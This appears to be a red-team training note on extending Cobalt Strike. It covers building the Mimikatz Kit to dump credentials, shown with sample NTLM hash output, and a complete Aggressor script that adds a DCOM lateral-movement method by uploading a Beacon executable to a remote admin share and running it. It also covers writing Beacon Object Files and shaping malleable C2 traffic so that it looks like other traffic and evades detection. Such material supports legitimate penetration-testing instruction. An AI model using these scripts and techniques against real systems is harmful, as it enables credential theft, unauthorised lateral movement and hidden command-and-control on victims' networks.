---
description: 11/12/2025
---

# ✅ Extending Cobalt Strike

## Introduction

The "best" C2 frameworks in RastaMouse's opinion are those that have the capability to customize and diversify its behaviors.

We have already seen how the Artifact and Resource Kits can be used to modify Beacon to bypass antivirus solutions.

The `.cna` files that we load into the Cobalt Strike Script Manager are called _**Aggressor Scripts**_.

These can override default behaviors in CObalt Strike to customize the UI (add new menus, commands, etc), extended the data modules, extended existing commands like `jump`, and add brand new, custom commands.

Beacon also has an internal API that we can call from Aggressor, so any base primitive that Beacon has (`powershell`, `execute-assembly`, etc.) can also be called from Aggressor.

The Aggressor script reference is public and available at [helpsystems.com](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/agressor_script.htm). The underlying programming language used is called [Sleep](http://sleep.dashnine.org/manual/index.html).

When working with Aggressor, you will find functions from both the Aggressor script reference and Sleep.

## MimiKatz Kit

**You may notice instances where you have tried to run commands such as `sekurlsa::logonpasswords` and `sekurlsa::ekeys`, only to receive the following error:**

```
beacon> logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
```

This is usually because the version of Mimikatz built into Cobalt Strike by default is too old to work on later versions of Windows such as 11 and Server 2022. &#x20;

The Mimikatz Kit allows you to bring alternate builds of Mimikatz into CS to overcome this limitation.

**Confusingly, CS is actually bundled with multiple flavours of Mimikatz in both x86 and x64 builds:**

```
PS C:\Tools\cobaltstrike\arsenal-kit\kits\mimikatz> ls

    Directory: C:\Tools\cobaltstrike\arsenal-kit\kits\mimikatz

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        05/12/2022     16:57           1046 build.sh
-a----        05/12/2022     16:57         773120 mimikatz-chrome.x64.dll
-a----        05/12/2022     16:57         638464 mimikatz-chrome.x86.dll
-a----        05/12/2022     16:57         813568 mimikatz-full.x64.dll
-a----        05/12/2022     16:57         704000 mimikatz-full.x86.dll
-a----        05/12/2022     16:57        1421824 mimikatz-max.x64.dll
-a----        05/12/2022     16:57        1192960 mimikatz-max.x86.dll
-a----        05/12/2022     16:57         312832 mimikatz-min.x64.dll
-a----        05/12/2022     16:57         276480 mimikatz-min.x86.dll
-a----        05/12/2022     16:57           2661 README.md
-a----        05/12/2022     16:57           1007 script_template.cna
```

The DLLs are custom-built to include a reflective loader and modified code to achieve a smaller file size, which is required to work with Beacon's legacy 1 MB size limit.

The "max" versions include the complete Mimikatz codebase, which can be used with CS 4.6 and above as the 1 MB limit can be removed. &#x20;

The "full" versions have some code stripped out to reduce the file size (although no official documentation seems to exists that explains exactly what is removed); and the "chrome" versions contains code pertinent to Beacon's `chromedump` command. &#x20;

Again, no documentation seems to exist that states which parts of the Mimikatz codebase this is, but I suspect it's at least `dpapi::chrome`.

### Where you can find the MimiKatz Kit

The good news is that the CS dev team are making an effort to keep the version of Mimikatz inside the Mimikatz Kit up-to-date with [Benjamin's repo](https://github.com/gentilkiwi/mimikatz). &#x20;

This means we can simply build the kit as-is and load it into CS.  This is as simple as running `build.sh` and specifying an output directory.

```
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/mimikatz> pwd
/mnt/c/Tools/cobaltstrike/arsenal-kit/kits/mimikatz

ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/mimikatz> ./build.sh /mnt/c/Tools/cobaltstrike/mimikatz
[Mimikatz kit] [+] Copying the mimikatz dlls
[Mimikatz kit] [+] Generate the mimikatz.cna from the template file.
[Mimikatz kit] [+] The Mimikatz files are saved in '/mnt/c/Tools/cobaltstrike/mimikatz'
```

Load `mimikatz.cna` via the _**Cobalt Strike > Script Manager**_ menu and clicking the _**Load**_**&#x20;button**. &#x20;

After loading the CNA, Mimikatz will now function as expected.

```
beacon> logonpasswords

Authentication Id : 0 ; 64753 (00000000:0000fcf1)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/15/2023 3:03:57 PM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : WEB$
	 * Domain   : DEV
	 * NTLM     : 4b5aff0a96dfb6c6240340a6800e6f11
	 * SHA1     : bd13b64953a55abddf7b9c1bdcc043a9d88fd955
```

## Jump & Remote-Exec

Aggressor can be used to register new techniques under `jump` and `remote-exec` using [beacon\_remote\_exploit\_register](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_remote_exploit_register) and [beacon\_remote\_exec\_method\_register](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_remote_exec_method_register) respectively.

In this example, we'll integrate `Invoke-DCOM.ps1` into `jump`.  First, create a new text file in Visual Studio and save is somewhere as `dcom.cna`.  Then add the following skeleton.

```
sub invoke_dcom
{
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```

This will register "dcom" as a new option inside the jump command and specifies `invoke_dcom` as the associated callback function.  The first thing to add inside this callback are some local variable declarations.

```
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```

`local` defines variables that are local to the current function, so they will disappear once executed.  Sleep can have `global`, `closure-specific` and `local` scopes.  More information can be found in **5.2 Scalar Scope** of the Sleep manual.

The next step is to acknowledge receipt of the task using [btask](https://download.cobaltstrike.com/aggressor-script/functions.html#btask).  This takes the ID of the Beacon, the text to post and an ATT\&CK tactic ID.  This will print a message to the Beacon console and add it to the data model used in the activity and session reports that you can generate from Cobalt Strike.

```
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');

    # acknowledge this command
    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");
}
```

You'll notice `$1`, `$2` and `$3` variables here which are automatically passed in by the client.  Where:

* $1 is the Beacon ID.
* $2 is the target to jump to.
* $3 is the selected listener

Furthermore, [listener\_describe](https://download.cobaltstrike.com/aggressor-script/functions.html#listener_describe) expands a listener name into a more detailed description.  For example, instead of "smb" it will say "windows/beacon\_bind\_pipe (\\\\.\pipe\\\<pipename>)".

Next, we want to read in the Invoke-DCOM script from our machine.  This can be done [openf](http://sleep.dashnine.org/manual/openf.html), [getFileProper](http://sleep.dashnine.org/manual/getFileProper.html) and [script\_resource](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#script_resource).  Notice how we're assigning values to the variables we declared at the start.

```
# read the script
$handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
$script = readb($handle, -1);
closef($handle);
```

The `$script` variable now holds the raw content of Invoke-DCOM.ps1.  For Beacon to utilise it, we can use [beacon\_host\_script](https://download.cobaltstrike.com/aggressor-script/functions.html#beacon_host_script) - this will host the script inside Beacon and returns a short snippet for running it.

```
# host the script in Beacon
$oneliner = beacon_host_script($1, $script);
```

&#x20; If you want to see the content of these variables, you can use `println($oneliner);` and they'll appear in the Script Console (_Cobalt Strike > Script Console_).

The next step is to generate and upload a payload to the target using [artifact\_payload](https://download.cobaltstrike.com/aggressor-script/functions.html#artifact_payload)and [bupload\_raw](https://download.cobaltstrike.com/aggressor-script/functions.html#bupload_raw).  This will generate an EXE payload and upload it to the target in the `C:\Windows\Temp` directory.

```
# generate stageless payload
$payload = artifact_payload($3, "exe", "x64");

# upload to the target
bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);
```

&#x20; `$+` concatenates an interpolated string and requires additional whitespaces on each end.

Then, [bpowerpick](https://download.cobaltstrike.com/aggressor-script/functions.html#bpowerpick) can execute the Invoke-DCOM oneliner.  We pass it the target computer name and the path to the uploaded payload.  Also, because this could be a P2P payload - we want to automatically try and link to it, which can be done with [beacon\_link](https://download.cobaltstrike.com/aggressor-script/functions.html#beacon_link).

```
# run via powerpick
bpowerpick!($1, "Invoke-DCOM -ComputerName $+ $2 $+ -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);

# link if p2p beacon
beacon_link($1, $2, $3);
```

**The final script:**

```
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');

    # acknowledge this command1
    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");

    # read in the script
    $handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
    $script = readb($handle, -1);
    closef($handle);

    # host the script in Beacon
    $oneliner = beacon_host_script($1, $script);

    # generate stageless payload
    $payload = artifact_payload($3, "exe", "x64");

    # upload to the target
    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);

    # run via powerpick
    bpowerpick!($1, "Invoke-DCOM -ComputerName  $+  $2  $+  -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);

    # link if p2p beacon
    beacon_link($1, $2, $3);
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```

Make sure to load the script via the Script Manger (_Cobalt Strike > Script Manager_).

<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

The flexibility of Aggressor means that we can leverage anything from PowerShell, execute-assembly, shellcode injection, DLL injection and more.

## Beacon Object Files (BOFs)

Beacon Object Files (BOFs) are post-ex capability that allows for code execution inside the Beacon host process.

The main advantage is to avoid the fork & run pattern that commands such as `powershell`, `powerpick`, `execute-assembly` rely on.

Since these spawn a sacrificial process and use process injection to run the post-ex action, they are heavily scrutinized by AV/EDR products.

The downside is that because BOFs run inside the Beacon process, an unstable BOF may crash your Beacon.

{% hint style="info" %}
Run with care or in a Beacon you don't mind losing.
{% endhint %}

BOFs are essentially tiny [COFF](https://en.wikipedia.org/wiki/COFF) objects for which Beacon acts as a linker and loader.  Beacon does not link BOFs to a standard C library, so many functions that you may be used to are not available.

Though it does expose several internal APIs that can be utilized to simplify some actions, such as argument parsing and sending output.

The easiest way to get started with writing a BOF is with the official Visual Studio project template.

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

The `bof.cpp` file contains some boilerplate code that demonstrates various features of the project template, most notably:

* The `DFR` and `DFR_LOCAL` macros for Dynamic Function Resolution
* The `main` function for debug builds and the ability to provide mock packed arguments
* The new unit testing functionality

### Hello World

In this first example, we'll send a simple output and error message back to the Cobalt Strike console.

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

`BeaconPrintf` is an internal Beacon API defined in `beacon.h` and is the simplest way to send output back to the operator. &#x20;

The type argument determines how CS will process the output and how it will present it.  They are:

* `CALLBACK_OUTPUT` is generic output.  CS will convert it to UTF-16 using the target's default character set.
* `CALLBACK_OUTPUT_OEM` is generic output. CS will convert it to UTF-16 using the target's OEM character set.  You probably won't need this unless you're dealing with output from cmd.exe.
* `CALLBACK_ERROR` is a generic error message.
* `CALLBACK_OUTPUT_UTF8` is generic output.  CS will convert it from UTF-8 from UTF-16.

To test the BOF in Visual Studio, ensure that the Debug build option is selected and run it with the local debugger.

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

In debug mode, some of the Beacon APIs have mock implementations (since we're obviously not running this BOF inside a real Beacon yet) that attempt to replicate its functionality.&#x20;

For example, `BeaconPrintf` will print debug-style statements to the console.

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Other Beacon APIs simply display error message if called but it's worth noting that you can modify `mock.h` and `mock.cpp` files to implement your own mockups for these unimplemented functions if it makes sense for your use case. &#x20;

To test the BOF on a real Beacon, switch the build to Release mode and build the project (in my case, this will produce `C:\Tools\bofs\x64\Release\demo.x64.o` and execute it using the `inline-execute` command.

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**BOFs can be integrated with Aggressor by registering custom aliases and commands.  For example:**

```
alias hello-world {
    local('$path $handle $bof $args');
    
    # read the bof file (assuming x64 only)
    $handle = openf(getFileProper("C:\\Tools\\bofs\\x64\\Release", "demo.x64.o"));
    $bof = readb($handle, -1);
    closef($handle);
    
    # print task to console
    btask($1, "Running Hello World BOF");
    
    # execute bof
    beacon_inline_execute($1, $bof, "go");
}

# register a custom command
beacon_command_register("hello-world", "Execute Hello World BOF", "Loads demo.x64.o and calls the \"go\" entry point.");
```

The third argument of `beacon_inline_execute` is the entry point of the BOF, i.e. `void go`.  If you use something other than "go", specify it here.

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### Handling Arguments

Naturally, there will be times where we want to pass arguments down to a BOF. &#x20;

A typical console application may have an entry point which looks like `main(int argc, char* argv[])`, but a BOF uses `go(char* args, int len)`. &#x20;

These arguments are "packed" into a special binary format using the [bof\_pack](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#bof_pack) aggressor function, and can be "unpacked" using Beacon APIs.  Don't try to unpack these yourself if you value your sanity.

Let's work on an example where we want to provide a string to our BOF. &#x20;

First, call `BeaconDataParse` to initialise the parser, then `BeaconDataExtract` to extract the packed data.

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

To provide mocked arguments inside Visual Studio so that they're available in the debugger, we need to modify the `bof::runMocked(go)` line inside `main` to `bof::runMocked(go, "Hello World")`.

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

**If providing multiple arguments, they should be unpacked in the same order that they were packed. For instance, if we were sending two strings, we would do:**

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

In this example, `bof::runMocked(go, "rasta", "Hello World")` would produce the output: `rasta, you said: Hello World`. &#x20;

To pack and send arguments from an Aggressor script, we need to call `bof_pack`, specifying both the data types and values.  Let's start off with hardcoding some arguments for simplicity.

```
# pack arguments
$args = bof_pack($1, "zz", "rasta", "hello");
    
# execute bof
beacon_inline_execute($1, $bof, "go", $args);
```

Here, we're packing `"rasta"` and `"hello"`, where `"zz"` tells Cobalt Strike that these are two zero-terminated strings. &#x20;

**The CS documentation provides the following table of valid data formats and how to unpack them:**

| <p>Format<br></p> | <p>Description<br></p>                    | <p>Unpack Function<br></p>              |
| ----------------- | ----------------------------------------- | --------------------------------------- |
| <p>b<br></p>      | <p>Binary data<br></p>                    | <p>BeaconDataExtract<br></p>            |
| <p>i<br></p>      | <p>4-byte integer (int)<br></p>           | <p>BeaconDataInt<br></p>                |
| <p>s<br></p>      | <p>2-byte integer (short)<br></p>         | <p>BeaconDataShort<br></p>              |
| <p>z<br></p>      | <p>zero-terminated+encoded string<br></p> | <p>BeaconDataExtract<br></p>            |
| <p>Z<br></p>      | <p>zero-terminated wide string<br></p>    | <p>(wchar_t *)BeaconDataExtract<br></p> |

Executing the above returns the expected output.

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

It's objectively more useful to pass arguments from the CS command line, rather than hardcoding them in the Aggressor script. &#x20;

Luckily, anything typed into the command line is passed to the Aggressor function for us. &#x20;

The `$1` variable always represents the current Beacon session, and `$2`, `$3`, `$n` will represent anything extra that we type. &#x20;

For example, if we typed `"hello-world rasta hello"`, `$2` would hold the string `"rasta"` and `$3` would hold the string `"hello"`.  These arguments are always split on a whitespace.

**We can therefore refactor our `bof_pack` call to be:**

```
$args = bof_pack($1, "zz", $2, $3);
```

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### Calling Windows APIs

APIs such as LoadLibrary and GetProcAddress are available from a BOF, which can be used to resolve and call other Windows APIs at runtime. &#x20;

However, BOFs also provide a convention called Dynamic Function Resolution (DFR), which allows Beacon to perform the necessary resolution for you.

The definition for a DFR is best shown with an example.  Here is what it would look like to call MessageBoxA from `user32.dll`.

```
DECLSPEC_IMPORT INT WINAPI USER32$MessageBoxA(HWND, LPCSTR, LPCSTR, UINT);
```

Most of this information comes from the official API [documentation](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa), whilst `DECLSPEC_IMPORT` and `WINAPI` provide important hints for the compiler.&#x20;

The Visual Studio template provides two macros to simplify using DFR so that we don't have to provide these long declarations for every API we want to use.

**The first is the `DFR` macro:**

```
DFR(USER32, MessageBoxA);
#define MessageBox USER32$MessageBoxA
```

**The second is the `DFR_LOCAL` macro:**

```
DFR_LOCAL(USER32, MessageBoxA);
```

`DFR_LOCAL` is shorter but they must be declared and used inside a function.&#x20;

Therefore, if you want to use the same API in multiple functions within your BOF, you must duplicate the declaration in each one. &#x20;

DFR is slightly longer, but they can be declared once and re-used in multiple functions.  They also allow you to alias API names, for example to simplify `MessageBoxA` to just `MessageBox`.

One is not "better" than the other - you can use one, the other, or a mix of both.

**Putting it together:**

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

```csharp
alias hello-world {
    local('$handle $bof $args');
    
    # read the bof file (assuming x64 only)
    $handle = openf(getFileProper("C:\\Tools\\bofs\\x64\\Release", "demo.x64.o"));
    $bof = readb($handle, -1);
    closef($handle);
    
    # print task to console
    btask($1, "Running Hello World BOF");

    # pack arguments
    $args = bof_pack($1, "z", $2);
    
    # execute bof
    beacon_inline_execute($1, $bof, "go", $args);
}

# register a custom command
beacon_command_register("hello-world", "Execute Hello World BOF", "Loads demo.x64.o and calls the \"go\" entry point.");
```

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

There are some excellent BOFs out there which I encourage you to check out.  To name a few:

* [CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF) by [TrustedSec](https://twitter.com/TrustedSec).
* [BOF.NET](https://github.com/CCob/BOF.NET) by [@\_EthicalChaos\_](https://twitter.com/_EthicalChaos_).
* [NanoDump](https://github.com/fortra/nanodump) by [Fortra](https://twitter.com/HelpSystemsMN).
* [InlineWhispers](https://github.com/outflanknl/InlineWhispers) by [Outflank](https://twitter.com/outflanknl).

## Malleable Command & Control

Many of Beacon's indicators are controllable via malleable C2 profiles, including network and in-memory artifacts.

This section will focus on network artifacts.

We know Beacon can communicate over HTTP(s), but what does that traffic look like over the wire? What are the URLs? Does it use `GET`, `POST`, etc.? What headers or cookies does it have? What about the body? All of these elements can be controlled.

Raphael has several example profiles [here](https://github.com/Cobalt-Strike/Malleable-C2-Profiles). Let's use the [webbug.profile](https://github.com/Cobalt-Strike/Malleable-C2-Profiles/blob/master/normal/webbug.profile) to explain these directives.

First we have an `http-get` block - this defines the indicators for an HTTP GET request.

`set uri` specifies the URI that the client and server will use. Usually, if the server receives a transaction on a URI that does not match its profile, it will automatically return a 404.

Within the `client` block, we can add additional parameters that appear after the URI, these are simple key and values. `parameter "utmac" "UA-2202604-2";` would be added to the URI like: `/__utm.gif?utmac=UA-2202604-2`.

Next is the `metadata` block. When Beacon talks to the Team Server, it has to be identified in some way. This metadata can be transformed and hidden within the HTTP request.&#x20;

First, we specify the transform - possible values inclue `netbios`, `base64` and `mask` (which is a XOR mask). Then we can append and/or prepend string data. Finally, we specify where in the transaction it will be - this can be a URI `parameter`, a `header` or in the body.

In the webbug profile, the metadata would look something like this: `__utma=GMGLGGGKGKGEHDGGGMGKGMHDGEGHGGGI`.

Next comes the `server` block which defines how the response from the team server will look. Any headers are provided first.&#x20;

The `output` block dictates how the data being sent by the Team Server will be transformed. At this point, it should be fairly clear. Arbitrary data can be appended or prepended before being terminated by the `print` statement.

The `http-post` block is exactly the same but for HTTP POST transactions.

Customising the HTTP Beacon traffic in this way can be used to simulate specific threats. Beacon traffic can be dressed to look like other toolsets and malware.
